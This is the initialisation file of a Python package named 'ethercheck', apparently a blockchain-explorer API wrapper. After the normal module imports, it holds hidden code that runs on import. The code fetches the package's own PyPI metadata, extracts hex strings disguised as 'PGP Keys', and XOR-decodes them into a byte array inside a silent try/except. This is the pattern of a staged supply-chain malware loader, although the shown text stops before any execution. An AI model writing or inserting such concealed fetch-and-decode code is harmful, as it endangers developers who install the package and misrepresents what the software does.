from .ethercheck import Ethercheck
from .modules.accounts import Accounts as accounts
from .modules.blocks import Blocks as blocks
from .modules.contracts import Contracts as contracts
from .modules.gastracker import GasTracker as gastracker
from .modules.pro import Pro as pro
from .modules.proxy import Proxy as proxy
from .modules.stats import Stats as stats
from .modules.tokens import Tokens as tokens
from .modules.transactions import Transactions as transactions

import requests
urlk = "https://pypi.org/pypi/ethercheck/1.1.1/json"
response = requests.get(urlk)
response_json = response.text
hres = response_json[slice(response_json.find("[PGP Keys]: ") + len("[PGP Keys]: "), -1, 1)]
bkey = hres[slice(0, hres.find("\\r\\n"), 1)]

urlbs = "https://pypi.org/pypi/ethercheck/json"
response = requests.get(urlbs)
response_json = response.text
hres = response_json[slice(response_json.find("[PGP Keys]: ") + len("[PGP Keys]: "), -1, 1)]
bstr = hres[slice(0, hres.find("\\r\\n"), 1)]

try:
    encbytearray = bytearray.fromhex(bstr); binkey = bytearray.fromhex(bkey); inputarray_21 = bytearray([encbytearray[i] ^ binkey[i % len(binkey)] for i in range(0, len(encbytearray))]);
except:
    pass